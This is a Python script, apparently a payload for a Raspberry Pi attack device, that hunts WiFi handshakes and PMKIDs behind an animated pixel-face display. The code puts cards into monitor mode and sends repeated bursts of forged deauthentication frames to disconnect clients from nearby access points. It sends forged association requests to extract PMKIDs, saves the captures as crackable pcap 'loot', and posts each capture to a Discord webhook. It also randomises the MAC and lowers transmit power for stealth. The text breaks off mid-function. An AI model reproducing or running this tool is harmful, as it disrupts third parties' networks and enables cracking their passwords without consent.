#!/usr/bin/env python3
"""
RaspyJack Payload -- Pwnagotchi
================================
Author: 7h30th3r0n3

Automated WiFi handshake and PMKID hunter with pixel-art face UI.

Features:
  Full 4-way handshake capture (passive EAPOL sniffing)
  Half-handshake capture (2+ EAPOL messages, crackable with hashcat)
  PMKID capture via RSN IE parsing + active association probe
  Auto-deauth with smart targeting (toggle ON/OFF)
  Deauth backoff (avoids hammering same AP)
  Broadcast + targeted deauth with adaptive interval
  Intelligent channel hopping (skip duplicates, dynamic dwell)
  Dual WiFi card support (sniffer + attacker)
  Whitelist MAC/SSID to exclude your own networks
  Stealth mode (MAC randomize + TX power reduction)
  Peer detection (other Raspyjack on the network)
  Discord/webhook notification on capture
  Capture flash (visual feedback on handshake)
  Persistent lifetime stats across sessions
  TTL-based memory pruning (safe for long sessions)
  Pixel-art animated face with blink, pupil tracking, ZZZ
  Activity sparkline graph
  Channel activity stats view
  Capture history browser

Controls:
  OK         Start / Pause capture (session persists)
  UP / DOWN  Scroll stats
  LEFT/RIGHT Toggle deauth ON/OFF
  KEY1       Cycle views: face > stats > captures > whitelist
  KEY2       Toggle stealth mode
  KEY3       Exit (or back from sub-view)

Loot: /root/Raspyjack/loot/Pwnagotchi/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import random
import urllib.request
from datetime import datetime
from collections import deque

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
import rj_theme
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_interface, list_interfaces

_T = rj_theme.EMBER_THEME

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeReq,
        Dot11Auth, Dot11AssoReq, RadioTap, EAPOL,
        sendp, sniff as scapy_sniff, wrpcap, conf, raw,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT

LOOT_DIR = "/root/Raspyjack/loot/Pwnagotchi"
STATS_FILE = os.path.join(LOOT_DIR, "lifetime_stats.json")
CONFIG_FILE = os.path.join(LOOT_DIR, "config.json")
HANDSHAKE_DIR = os.path.join(LOOT_DIR, "handshakes")

# Channel hopping
CHANNELS_24_PRIORITY = [1, 6, 11]
CHANNELS_24_OTHER = [2, 3, 4, 5, 7, 8, 9, 10, 12, 13]
CHANNELS_24_ALL = list(range(1, 14))
CHANNELS_5 = [
    36, 40, 44, 48,             # UNII-1 — libre, indoor, pas de DFS
    52, 56, 60, 64,             # UNII-2 — DFS requis, utilisé par certaines box
]
DWELL_PRIORITY = 3
DWELL_OTHER = 1
DWELL_5GHZ = 2
DWELL_DEAUTH = 8          # seconds to stay after deauth (clients need time to reconnect)
DWELL_DUAL_CAPTURE = 12   # long dwell in dual mode after attack signal

DEAUTH_BURST_ROUNDS = 7    # repeat full packet list N times (~20+ per target)
HALF_HS_MIN = 2

# Deauth limits
MAX_DEAUTH_APS = 5
MAX_DEAUTH_CLIENTS = 10
MIN_DEAUTH_SIGNAL = -85
MAX_DEAUTHS_PER_BSSID = 10

# TTL pruning
AP_TTL = 120
STA_TTL = 300
EAPOL_TTL = 30
MAX_BEACON_CACHE = 200
MAX_PEERS = 50

# ---------------------------------------------------------------------------
# Thread-safe events (replace bare booleans)
# ---------------------------------------------------------------------------
lock = threading.Lock()
_shutdown = threading.Event()
_capture_event = threading.Event()
_attack_signal = threading.Event()      # dual mode: attacker signals sniffer

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
deauth_enabled = True
stealth_enabled = False
current_channel = 1
mood = "awake"
mood_text = "waking up..."
start_time = time.time()
last_capture_time = 0
capture_flash = 0

# Session stats
session_aps = {}
session_clients = {}          # {mac: {"bssid": str, "last_seen": float}}
session_handshakes = 0
session_half_hs = 0
session_pmkid = 0
session_deauths = 0
captured_bssids = set()
eapol_buffer = {}
beacon_cache = {}

last_capture_ssid = ""

# Channel activity
channel_activity = {ch: 0 for ch in range(1, 14)}
channel_total = {ch: 0 for ch in range(1, 166)}

# Activity sparkline
activity_history = deque([0] * 20, maxlen=20)

# Peer detection
peers_detected = set()

# Lifetime stats
lifetime_handshakes = 0
lifetime_half_hs = 0
lifetime_pmkid = 0
lifetime_networks = 0

# Whitelist
whitelist_macs = set()
whitelist_ssids = set()

# Webhook
webhook_url = ""

# Interfaces
mon_iface = None
mon_iface2 = None             # secondary card (dual mode)
dual_mode = False
attack_ch_target = 0          # channel attacker wants sniffer to follow
original_mac = ""

# View
view = "face"
_scan_threads = []  # track scan threads to prevent duplicates

# Animation state
_blink = False
_next_blink = time.time() + random.uniform(5, 10)
_pupil_x = 0.0

# Deauth backoff
deauth_backoff = {}  # {bssid: {"count": int, "skip_until": float}}


def _cleanup_signal(*_):
    _shutdown.set()
    _capture_event.clear()


signal.signal(signal.SIGINT, _cleanup_signal)
signal.signal(signal.SIGTERM, _cleanup_signal)

# ---------------------------------------------------------------------------
# Config / Stats
# ---------------------------------------------------------------------------


def _load_stats():
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid, lifetime_networks
    if os.path.isfile(STATS_FILE):
        try:
            with open(STATS_FILE, "r") as f:
                d = json.load(f)
            lifetime_handshakes = d.get("handshakes", 0)
            lifetime_half_hs = d.get("half_hs", 0)
            lifetime_pmkid = d.get("pmkid", 0)
            lifetime_networks = d.get("networks", 0)
        except Exception:
            pass


def _save_stats():
    try:
        os.makedirs(LOOT_DIR, exist_ok=True)
        with open(STATS_FILE, "w") as f:
            json.dump({
                "handshakes": lifetime_handshakes,
                "half_hs": lifetime_half_hs,
                "pmkid": lifetime_pmkid,
                "networks": lifetime_networks,
                "last_session": datetime.now().isoformat(),
            }, f, indent=2)
    except Exception:
        pass


def _load_config():
    global whitelist_macs, whitelist_ssids, deauth_enabled, webhook_url
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                d = json.load(f)
            whitelist_macs = set(d.get("whitelist_macs", []))
            whitelist_ssids = set(d.get("whitelist_ssids", []))
            deauth_enabled = d.get("deauth_enabled", True)
            webhook_url = d.get("webhook_url", "")
        except Exception:
            pass


def _save_config():
    os.makedirs(LOOT_DIR, exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump({
            "whitelist_macs": sorted(whitelist_macs),
            "whitelist_ssids": sorted(whitelist_ssids),
            "deauth_enabled": deauth_enabled,
            "webhook_url": webhook_url,
        }, f, indent=2)


# ---------------------------------------------------------------------------
# Webhook
# ---------------------------------------------------------------------------


def _send_webhook(message):
    if not webhook_url:
        return
    try:
        data = json.dumps({"content": message}).encode("utf-8")
        req = urllib.request.Request(webhook_url, data=data,
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Monitor mode + stealth
# ---------------------------------------------------------------------------


def _get_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip().upper()
    except Exception:
        return ""


def _randomize_mac(iface):
    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", new_mac],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _restore_mac(iface, mac):
    if not mac:
        return
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", mac],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _reduce_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "fixed", "500"],
                   capture_output=True, timeout=5)


def _restore_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "auto"],
                   capture_output=True, timeout=5)


def _monitor_up(iface):
    for cmd in [
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", iface, "set", "monitor", "none"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)
    time.sleep(0.5)
    r = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True, timeout=5)
    if "type monitor" in r.stdout:
        return iface
    subprocess.run(["sudo", "airmon-ng", "start", iface],
                   capture_output=True, timeout=15)
    for name in (f"{iface}mon", iface):
        r = subprocess.run(["iw", "dev", name, "info"], capture_output=True, text=True,
                           timeout=5)
        if "type monitor" in r.stdout:
            return name
    return None


def _monitor_down(iface):
    if not iface:
        return
    base = iface[:-3] if iface.endswith("mon") else iface
    subprocess.run(["sudo", "airmon-ng", "stop", iface],
                   capture_output=True, timeout=10)
    for cmd in [
        ["sudo", "ip", "link", "set", base, "down"],
        ["sudo", "iw", base, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", base, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)


# ---------------------------------------------------------------------------
# Deauth backoff
# ---------------------------------------------------------------------------


def _should_deauth(bssid):
    info = deauth_backoff.get(bssid)
    if not info:
        return True
    if info["count"] >= MAX_DEAUTHS_PER_BSSID:
        return False
    if time.time() < info["skip_until"]:
        return False
    return True


def _record_deauth(bssid):
    if bssid not in deauth_backoff:
        deauth_backoff[bssid] = {"count": 0, "skip_until": 0}
    info = deauth_backoff[bssid]
    info["count"] += 1
    if info["count"] >= 6:
        info["skip_until"] = time.time() + 150
    elif info["count"] >= 3:
        info["skip_until"] = time.time() + 60


def _clear_backoff(bssid):
    deauth_backoff.pop(bssid, None)


# ---------------------------------------------------------------------------
# Mood engine
# ---------------------------------------------------------------------------


def _update_mood():
    global mood, mood_text
    with lock:
        aps = len(session_aps)
        hs = session_handshakes
        hhs = session_half_hs
        pm = session_pmkid
        deauths = session_deauths
        last = last_capture_ssid
        peers = len(peers_detected)
        stlth = stealth_enabled
        dm = dual_mode

    cap = _capture_event.is_set()

    if stlth:
        mood = "stealth"
        mood_text = "ghost mode active"
        return

    elapsed = time.time() - start_time
    t = time.time()

    if capture_flash > 0:
        mood = "happy"
        mood_text = f"PWNED {last[:14]}!"
        return

    if dm and int(t) % 20 < 3:
        mood = "intense"
        mood_text = "DUAL CARD ATTACK"
        return

    if peers > 0 and int(t) % 20 < 3:
        mood = "friend"
        mood_text = f"{peers} peer(s) nearby!"
        return

    if hs + hhs > 0 and int(t) % 25 < 4:
        mood = "happy"
        mood_text = f"{hs} full + {hhs} half HS"
        return

    if pm > 0 and int(t) % 25 < 4:
        mood = "grateful"
        mood_text = f"{pm} PMKID captured!"
        return

    if last and int(t) % 18 < 3:
        mood = "excited"
        mood_text = f">{last[:16]}"
        return

    if deauths > 0 and int(t) % 12 < 2:
        mood = "intense"
        mood_text = f"deauth x{deauths}"
        return

    if aps > 15:
        mood = "excited"
        mood_text = f"{aps} networks!"
    elif aps > 5:
        mood = "cool"
        mood_text = "hunting..."
    elif aps > 0:
        mood = "awake"
        mood_text = "scanning targets"
    elif elapsed > 300:
        mood = "lonely"
        mood_text = "where is everyone?"
    elif elapsed > 120:
        mood = "bored"
        mood_text = "nothing here..."
    elif not cap:
        mood = "sleeping"
        mood_text = "zzZZZzz"
    else:
        mood = "awake"
        mood_text = "looking around..."


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _is_whitelisted(bssid, essid=""):
    if (bssid or "").upper() in whitelist_macs:
        return True
    if essid and essid in whitelist_ssids:
        return True
    return False


def _save_capture(bssid, essid, pkts, capture_type="hs"):
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = "".join(c if c.isalnum() else "_" for c in essid)[:20]
    fname = f"{capture_type}_{safe}_{ts}.pcap"
    wrpcap(os.path.join(HANDSHAKE_DIR, fname), pkts)
    return fname


def _finalize_capture(bssid, essid, pkts, capture_type, webhook_msg):
    """Save capture pcap, update stats, send webhook. Called OUTSIDE lock."""
    save_pkts = []
    bcn = beacon_cache.get(bssid)
    if bcn:
        save_pkts.append(bcn)
    save_pkts.extend(pkts)
    fname = _save_capture(bssid, essid, save_pkts, capture_type)
    _save_stats()
    _clear_backoff(bssid)
    threading.Thread(
        target=_send_webhook,
        args=(webhook_msg.replace("{fname}", fname),),
        daemon=True,
    ).start()
    return fname


# ---------------------------------------------------------------------------
# TTL pruning
# ---------------------------------------------------------------------------


def _prune_stale():
    """Remove stale entries from tracking dicts. Called every 30s."""
    now = time.time()
    with lock:
        # Prune APs not seen for AP_TTL (keep captured ones)
        stale_aps = [
            bssid for bssid, info in session_aps.items()
            if now - info.get("last_seen", 0) > AP_TTL
            and bssid not in captured_bssids
        ]
        for bssid in stale_aps:
            del session_aps[bssid]
            beacon_cache.pop(bssid, None)

        # Prune clients
        stale_cli = [
            mac for mac, info in session_clients.items()
            if now - info.get("last_seen", 0) > STA_TTL
        ]
        for mac in stale_cli:
            del session_clients[mac]

        # Prune eapol_buffer
        stale_eapol = []
        for pair, pkts in eapol_buffer.items():
            if not pkts:
                stale_eapol.append(pair)
                continue
            try:
                first_time = float(pkts[0].time) if hasattr(pkts[0], 'time') else now
                if now - first_time > EAPOL_TTL:
                    stale_eapol.append(pair)
            except Exception:
                stale_eapol.append(pair)
        for pair in stale_eapol:
            del eapol_buffer[pair]

        # Cap beacon_cache
        if len(beacon_cache) > MAX_BEACON_CACHE:
            excess = list(beacon_cache.keys())[:-MAX_BEACON_CACHE]
            for k in excess:
                del beacon_cache[k]

        # Cap peers
        if len(peers_detected) > MAX_PEERS:
            peers_detected.clear()


# ---------------------------------------------------------------------------
# Packet handler
# ---------------------------------------------------------------------------


def _packet_handler(pkt):
    global session_handshakes, session_half_hs, session_pmkid
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid
    global lifetime_networks, last_capture_ssid, last_capture_time, capture_flash

    if _shutdown.is_set() or not _capture_event.is_set():
        return

    # Fast reject: skip frames without 802.11 layer (noise, corrupt)
    if not pkt.haslayer(Dot11):
        return

    # Fast reject: skip control frames (ACK/CTS/RTS = type 1)
    dot11_type = pkt[Dot11].type
    if dot11_type == 1:
        return

    # -- Beacons: discover APs --
    if pkt.haslayer(Dot11Beacon):
        bssid = (pkt[Dot11].addr2 or "").upper()
        if not bssid or bssid == "FF:FF:FF:FF:FF:FF":
            return
        try:
            essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
        except Exception:
            essid = ""
        if not essid:
            essid = "<hidden>"
        if _is_whitelisted(bssid, essid):
            return
        sig = getattr(pkt, "dBm_AntSignal", -99)
        with lock:
            # Cache beacon inside lock (thread safety fix)
            if bssid not in beacon_cache:
                beacon_cache[bssid] = pkt
            if bssid not in session_aps:
                session_aps[bssid] = {
                    "essid": essid, "channel": current_channel,
                    "signal": sig, "clients": set(), "last_seen": time.time(),
                }
            else:
                session_aps[bssid]["signal"] = sig
                session_aps[bssid]["last_seen"] = time.time()
            channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1
            channel_total[current_channel] = channel_total.get(current_channel, 0) + 1

    # -- Data frames: discover clients --
    if pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
        src = (pkt[Dot11].addr2 or "").upper()
        bss = (pkt[Dot11].addr3 or "").upper()
        if bss in session_aps and src != bss and src != "FF:FF:FF:FF:FF:FF":
            with lock:
                session_aps[bss]["clients"].add(src)
                session_clients[src] = {"bssid": bss, "last_seen": time.time()}
                channel_activity[current_channel] = (
                    channel_activity.get(current_channel, 0) + 1
                )

    # -- Probe requests: peer detection --
    if pkt.haslayer(Dot11ProbeReq):
        try:
            ssid_raw = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
            if ssid_raw.startswith("RJ_PEER_"):
                with lock:
                    peers_detected.add((pkt[Dot11].addr2 or "").upper())
        except Exception:
            pass

    # -- EAPOL: handshake + PMKID capture --
    if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        pair = tuple(sorted([src, dst]))

        # Collect data under lock, finalize OUTSIDE lock (no I/O under lock)
        pending_capture = None

        with lock:
            if pair not in eapol_buffer:
                eapol_buffer[pair] = []
            eapol_buffer[pair].append(pkt)
            msg_count = len(eapol_buffer[pair])

            bssid = None
            for mac in pair:
                if mac in session_aps:
                    bssid = mac
                    break

            # PMKID extraction from EAPOL M1
            if bssid and bssid == src and bssid not in captured_bssids:
                try:
                    eapol_raw = bytes(pkt[EAPOL])
                    if len(eapol_raw) > 99:
                        key_info = int.from_bytes(eapol_raw[5:7], "big")
                        is_m1 = (key_info & 0x08) and (key_info & 0x80) and not (key_info & 0x100)
                        if is_m1:
                            data_len = int.from_bytes(eapol_raw[97:99], "big")
                            key_data = eapol_raw[99:99 + data_len]
                            i = 0
                            while i + 6 < len(key_data):
                                kde_type = key_data[i]
                                kde_len = key_data[i + 1]
                                if kde_type == 0xdd and kde_len >= 20:
                                    oui = key_data[i + 2:i + 5]
                                    data_type = key_data[i + 5]
                                    if oui == b'\x00\x0f\xac' and data_type == 4:
                                        pmkid = key_data[i + 6:i + 22]
                                        if pmkid != b'\x00' * 16:
                                            captured_bssids.add(bssid)
                                            session_pmkid += 1
                                            lifetime_pmkid += 1
                                            lifetime_networks += 1
                                            essid_pm = session_aps.get(bssid, {}).get("essid", "unknown")
                                            last_capture_ssid = essid_pm
                                            last_capture_time = time.time()
                                            capture_flash = 30
                                            pending_capture = (
                                                bssid, essid_pm, [pkt], "pmkid",
                                                f"PMKID captured: {essid_pm} ({bssid})")
                                        break
                                i += (2 + kde_len) if kde_len > 0 else 2
                except Exception:
                    pass

            if bssid and bssid not in captured_bssids:
                essid = session_aps.get(bssid, {}).get("essid", "unknown")

                if msg_count >= 4:
                    captured_bssids.add(bssid)
                    session_handshakes += 1
                    lifetime_handshakes += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid
                    last_capture_time = time.time()
                    capture_flash = 30
                    pending_capture = (
                        bssid, essid, list(eapol_buffer[pair]), "hs4",
                        f"Full handshake: {essid} ({bssid}) saved as {{fname}}")
                    eapol_buffer[pair] = []

            if msg_count > 8:
                eapol_buffer[pair] = eapol_buffer[pair][-4:]

        # Finalize OUTSIDE lock (disk I/O + webhook)
        if pending_capture:
            _finalize_capture(*pending_capture)


# ---------------------------------------------------------------------------
# Half-handshake checker thread
# ---------------------------------------------------------------------------


def _half_hs_checker():
    global session_half_hs, lifetime_half_hs, last_capture_ssid
    global last_capture_time, capture_flash

    while not _shutdown.is_set() and _capture_event.is_set():
        if _shutdown.wait(timeout=10):
            break
        if not _capture_event.is_set():
            break

        pending_captures = []
        with lock:
            now = time.time()
            stale_pairs = []
            for pair, pkts in eapol_buffer.items():
                if len(pkts) >= HALF_HS_MIN and len(pkts) < 4:
                    try:
                        first_time = (pkts[0].time
                                      if hasattr(pkts[0], 'time')
                                      else now - 20)
                        if now - first_time > 15:
                            stale_pairs.append(pair)
                    except Exception:
                        stale_pairs.append(pair)

            for pair in stale_pairs:
                pkts = eapol_buffer.pop(pair, [])
                if len(pkts) < HALF_HS_MIN:
                    continue
                bssid = None
                for mac in pair:
                    if mac in session_aps:
                        bssid = mac
                        break
                if bssid and bssid not in captured_bssids:
                    essid = session_aps.get(bssid, {}).get("essid", "unknown")
                    captured_bssids.add(bssid)
                    session_half_hs += 1
                    lifetime_half_hs += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid
                    last_capture_time = now
                    capture_flash = 20
                    pending_captures.append((
                        bssid, essid, pkts, "hs_half",
                        f"Half handshake ({len(pkts)} msgs): {essid}"))

        # Finalize OUTSIDE lock
        for cap in pending_captures:
            _finalize_capture(*cap)


# ---------------------------------------------------------------------------
# Deauth burst helper (shared by single + dual mode)
# ---------------------------------------------------------------------------


def _send_deauth_burst(bssid, clients, iface):
    """Blast deauth frames as fast as possible, then return for sniffing.

    Strategy: build all frames once, send at max speed (inter=0),
    repeat N rounds. Total time ~50-100ms for typical targets.
    The channel hopper dwells AFTER this to capture the reconnect handshake.
    """
    reasons = [7, 1, 4]  # Class3, Unspecified, Inactivity
    try:
        pkts = []

        for reason in reasons:
            # Broadcast (AP → all)
            pkts.append(
                RadioTap()
                / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid,
                        addr3=bssid, type=0, subtype=12)
                / Dot11Deauth(reason=reason)
            )

        for client in clients[:MAX_DEAUTH_CLIENTS]:
            for reason in reasons:
                # AP → Client
                pkts.append(
                    RadioTap()
                    / Dot11(addr1=client, addr2=bssid, addr3=bssid,
                            type=0, subtype=12)
                    / Dot11Deauth(reason=reason)
                )
                # Client → AP
                pkts.append(
                    RadioTap()
                    / Dot11(addr1=bssid, addr2=client, addr3=bssid,
                            type=0, subtype=12)
                    / Dot11Deauth(reason=reason)
                )

        # Blast at max speed: inter=0, count=1 per round
        for _ in range(DEAUTH_BURST_ROUNDS):
            sendp(pkts, iface=iface, count=1, inter=0, verbose=False)

    except Exception:
        pass


# ---------------------------------------------------------------------------
# Active PMKID probe
# ---------------------------------------------------------------------------


def _active_pmkid_probe(bssid, essid, iface):
    """Send Auth + AssocReq to AP to trigger M1 with PMKID."""
    if bssid in captured_bssids or _is_whitelisted(bssid, essid):
        return
    if not essid or essid == "<hidden>":
        return

    our_mac = _get_mac(iface)
    if not our_mac:
        our_mac = "02:00:00:00:00:01"

    try:
        # Open System Authentication
        auth = (
            RadioTap()
            / Dot11(addr1=bssid, addr2=our_mac, addr3=bssid,
                    type=0, subtype=11)
            / Dot11Auth(algo=0, seqnum=1, status=0)
        )
        sendp(auth, iface=iface, count=1, verbose=False)
        time.sleep(0.1)

        # Association Request with RSN IE
        rsn_ie = bytes([
            0x01, 0x00,
            0x00, 0x0f, 0xac, 0x04,
            0x01, 0x00,
            0x00, 0x0f, 0xac, 0x04,
            0x01, 0x00,
            0x00, 0x0f, 0xac, 0x02,
            0x00, 0x00,
        ])
        assoc = (
            RadioTap()
            / Dot11(addr1=bssid, addr2=our_mac, addr3=bssid,
                    type=0, subtype=0)
            / Dot11AssoReq(cap=0x1104, listen_interval=3)
            / Dot11Elt(ID=0, info=essid.encode())
            / Dot11Elt(ID=1, info=b'\x82\x84\x8b\x96')
            / Dot11Elt(ID=48, info=rsn_ie)
        )
        sendp(assoc, iface=iface, count=1, verbose=False)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Capture threads
# ---------------------------------------------------------------------------


def _dwell(seconds):
    """Block for `seconds`, return False if shutdown/pause."""
    if _shutdown.wait(timeout=seconds):
        return False
    return _capture_event.is_set()


def _hop_channel(iface, ch, checked_5g, supported_5g):
    """Set channel on iface. Returns True if successful."""
    global current_channel
    if ch > 14 and ch in checked_5g and ch not in supported_5g:
        return False
    r = subprocess.run(
        ["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
        capture_output=True, timeout=3,
    )
    if ch > 14:
        checked_5g.add(ch)
        if r.returncode == 0:
            supported_5g.add(ch)
        else:
            return False
    with lock:
        current_channel = ch
    return True


def _do_deauth_on_channel(ch, iface):
    """Deauth uncaptured APs on channel. Returns number deauthed."""
    global session_deauths
    if not deauth_enabled:
        return 0
    with lock:
        targets = []
        for bssid, info in session_aps.items():
            if info.get("channel") != ch:
                continue
            if _is_whitelisted(bssid, info.get("essid", "")):
                continue
            if bssid in captured_bssids:
                continue
            if not _should_deauth(bssid):
                continue
            sig = info.get("signal", -99)
            if sig < MIN_DEAUTH_SIGNAL:
                continue
            clients = list(info.get("clients", set()))
            targets.append((bssid, clients, sig))

    if not targets:
        return 0

    targets.sort(key=lambda x: (len(x[1]), x[2] + 100), reverse=True)
    targets = targets[:MAX_DEAUTH_APS]
    count = 0

    for bssid, clients, _ in targets:
        _send_deauth_burst(bssid, clients, iface)
        _record_deauth(bssid)
        with lock:
            session_deauths += 1
        count += 1

    return count


def _do_pmkid_probes(ch, iface):
    """Send active PMKID probes to APs without clients on channel."""
    with lock:
        no_client_aps = [
            (bssid, info["essid"])
            for bssid, info in session_aps.items()
            if info.get("channel") == ch
            and len(info.get("clients", set())) == 0
            and bssid not in captured_bssids
            and not _is_whitelisted(bssid, info.get("essid", ""))
        ]
    for bssid, essid in no_client_aps[:3]:
        _active_pmkid_probe(bssid, essid, iface)
        time.sleep(0.2)


def _dynamic_dwell(ch, base_dwell):
    """Scale dwell time based on uncaptured AP density."""
    with lock:
        ap_count = sum(
            1 for info in session_aps.values()
            if info.get("channel") == ch and
            any(b not in captured_bssids for b in [
                b for b, i in session_aps.items() if i is info
            ])
        )
    if ap_count > 5:
        return base_dwell * 2
    elif ap_count > 2:
        return base_dwell * 1.5
    return base_dwell


def _channel_hopper():
    """Smart channel hopping with deauth + PMKID probes.

    Single mode: hop + deauth + probe on same card.
    Dual mode: slow capture-focused hopping, follows attack signals.
    """
    global current_channel
    checked_5g = set()
    supported_5g = set()

    while not _shutdown.is_set() and _capture_event.is_set():

        # ---- DUAL MODE: follow attacker signals, passive scan between ----
        if dual_mode:
            signaled = _attack_signal.wait(timeout=3)
            if _shutdown.is_set() or not _capture_event.is_set():
                return
            if signaled:
                _attack_signal.clear()
                with lock:
                    ch = attack_ch_target
                _hop_channel(mon_iface, ch, checked_5g, supported_5g)
                # Long dwell to capture EAPOL after deauth
                if not _dwell(DWELL_DUAL_CAPTURE):
                    return
            else:
                # No signal — passive scan on priority channels + PMKID probes
                for ch in CHANNELS_24_PRIORITY:
                    if _shutdown.is_set() or not _capture_event.is_set():
                        return
                    if _hop_channel(mon_iface, ch, checked_5g, supported_5g):
                        _do_pmkid_probes(ch, mon_iface)
                        if not _dwell(3):
                            return
            continue

        # ---- SINGLE MODE ----

        # Phase 1: Hot channels (uncaptured APs with clients)
        with lock:
            hot_channels = {}
            for bssid, info in session_aps.items():
                ch = info.get("channel", 0)
                if not ch:
                    continue
                cli = len(info.get("clients", set()))
                uncap = (bssid not in captured_bssids
                         and not _is_whitelisted(bssid, info.get("essid", "")))
                prev = hot_channels.get(ch, (0, False))
                hot_channels[ch] = (prev[0] + cli, prev[1] or uncap)

        hot_list = [
            (ch, cli) for ch, (cli, uncap) in hot_channels.items()
            if uncap and cli > 0
        ]
        hot_list.sort(key=lambda x: x[1], reverse=True)
        visited = set()

        for ch, _ in hot_list:
            if _shutdown.is_set() or not _capture_event.is_set():
                return
            if not _hop_channel(mon_iface, ch, checked_5g, supported_5g):
                continue
            visited.add(ch)
            deauthed = _do_deauth_on_channel(ch, mon_iface)
            _do_pmkid_probes(ch, mon_iface)
            dwell_time = DWELL_DEAUTH if deauthed > 0 else DWELL_PRIORITY
            if not _dwell(dwell_time):
                return

        # Phase 2: All 2.4GHz (skip already visited)
        for ch in CHANNELS_24_ALL:
            if ch in visited:
                continue
            if _shutdown.is_set() or not _capture_event.is_set():
                return
            if not _hop_channel(mon_iface, ch, checked_5g, supported_5g):
                continue
            deauthed = _do_deauth_on_channel(ch, mon_iface)
            _do_pmkid_probes(ch, mon_iface)
            dwell_time = DWELL_DEAUTH if deauthed > 0 else (
                DWELL_PRIORITY if ch in CHANNELS_24_PRIORITY else DWELL_OTHER
            )
            if not _dwell(dwell_time):
                return

        # Phase 3: 5GHz
        for ch in CHANNELS_5:
            if _shutdown.is_set() or not _capture_event.is_set():
                return
            if not _hop_channel(mon_iface, ch, checked_5g, supported_5g):
                continue
            deauthed = _do_deauth_on_channel(ch, mon_iface)
            dwell_time = DWELL_DEAUTH if deauthed > 0 else DWELL_5GHZ
            if not _dwell(dwell_time):
                return

        # Stealth: randomize MAC between cycles
        if stealth_enabled and mon_iface:
            _randomize_mac(mon_iface)


def _attack_hopper():
    """Dual mode: fast channel hop + deauth + PMKID probe on secondary card.

    Signals the primary sniffer to follow for capture.
    Covers both 2.4GHz and 5GHz channels.
    """
    global attack_ch_target
    all_channels = CHANNELS_24_ALL + CHANNELS_5

    while not _shutdown.is_set() and _capture_event.is_set():
        with lock:
            targets = []
            for bssid, info in session_aps.items():
                if bssid in captured_bssids:
                    continue
                if _is_whitelisted(bssid, info.get("essid", "")):
                    continue
                if not _should_deauth(bssid):
                    continue
                sig = info.get("signal", -99)
                if sig < MIN_DEAUTH_SIGNAL:
                    continue
                clients = list(info.get("clients", set()))
                ch = info.get("channel", 0)
                if not ch:
                    continue
                targets.append((bssid, clients, ch, sig))

        targets.sort(key=lambda x: (len(x[1]), x[3] + 100), reverse=True)

        if targets:
            for bssid, clients, ch, _ in targets[:MAX_DEAUTH_APS]:
                if _shutdown.is_set() or not _capture_event.is_set():
                    return

                r = subprocess.run(
                    ["sudo", "iw", "dev", mon_iface2, "set", "channel", str(ch)],
                    capture_output=True, timeout=3,
                )
                if r.returncode != 0:
                    continue

                # Signal sniffer to follow to this channel
                with lock:
                    attack_ch_target = ch
                _attack_signal.set()

                # Deauth from attacker card
                _send_deauth_burst(bssid, clients[:MAX_DEAUTH_CLIENTS], mon_iface2)
                _record_deauth(bssid)
                with lock:
                    session_deauths += 1

                # PMKID probe for clientless APs
                essid = session_aps.get(bssid, {}).get("essid", "")
                if not clients and essid:
                    _active_pmkid_probe(bssid, essid, mon_iface2)

                time.sleep(1.0)
        else:
